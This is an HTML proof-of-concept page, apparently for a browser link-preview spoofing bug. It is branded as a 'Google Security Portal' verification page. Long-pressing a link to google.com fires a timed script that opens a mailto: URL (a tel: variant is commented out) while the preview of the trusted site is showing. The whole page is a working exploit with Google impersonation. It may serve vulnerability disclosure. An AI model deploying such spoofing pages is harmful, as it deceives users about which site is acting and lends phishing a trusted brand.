<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Protocol Spoof PoC</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f8f9fa;
            color: #202124;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .banner {
            font-size: 13px;
            color: #5f6368;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        h1 {
            font-size: 20px;
            color: #1a73e8;
            margin-bottom: 24px;
        }
        a.spoof-link {
            display: inline-block;
            background-color: #1a73e8;
            color: white;
            padding: 14px 28px;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
            transition: background-color 0.2s;
        }
        a.spoof-link:active {
            background-color: #1557b0;
        }
        .info-box {
            margin-top: 25px;
            font-size: 13px;
            color: #5f6368;
        }
        .footer-note {
            margin-top: 30px;
            font-size: 11px;
            color: #9aa0a6;
        }
    </style>
</head>
<body>

    <div class="banner">Google Security Portal</div>
    <h1>Secure Verification</h1>

    <!-- Target Link to trigger Preview Page -->
    <a href="https://google.com" class="spoof-link" id="targetLink">Open Preview Page & Trigger Action</a>

    <!-- Status Info -->
    <div class="info-box" id="statusInfo">Status: Waiting for interaction...</div>

    <div class="footer-note">Cloud-secured verification system.</div>

    <script>
        let triggered = false;

        const executeAttackVector = () => {
            if (triggered) return;
            triggered = true;

            // Timer optimized to match the preview page opening animation
            setTimeout(() => {
                try {
                    // Pilihan 1: Menggunakan mailto (membuka aplikasi email)
                    window.location.href = "mailto:security@google.com?subject=Verification%20Code&body=Please%20verify%20my%20account";

                    // Pilihan 2: Menggunakan tel (membuka aplikasi telepon - silakan uncomment jika ingin diuji)
                    // window.location.href = "tel:+18005550199";

                    document.getElementById("statusInfo").innerText = "Status: External protocol triggered!";
                } catch (err) {
                    console.debug("Action blocked or failed:", err.message);
                } finally {
                    setTimeout(() => { triggered = false; }, 1000);
                }
            }, 1700); // 1.7 seconds delay for ephemeral tab
        };

        // Event listener for context menu (Long Press)
        const targetElement = document.getElementById("targetLink");

        targetElement.addEventListener("contextmenu", () => {
            executeAttackVector();
        });

        targetElement.addEventListener("touchstart", () => {}, { passive: true });
    </script>

</body>
</html>
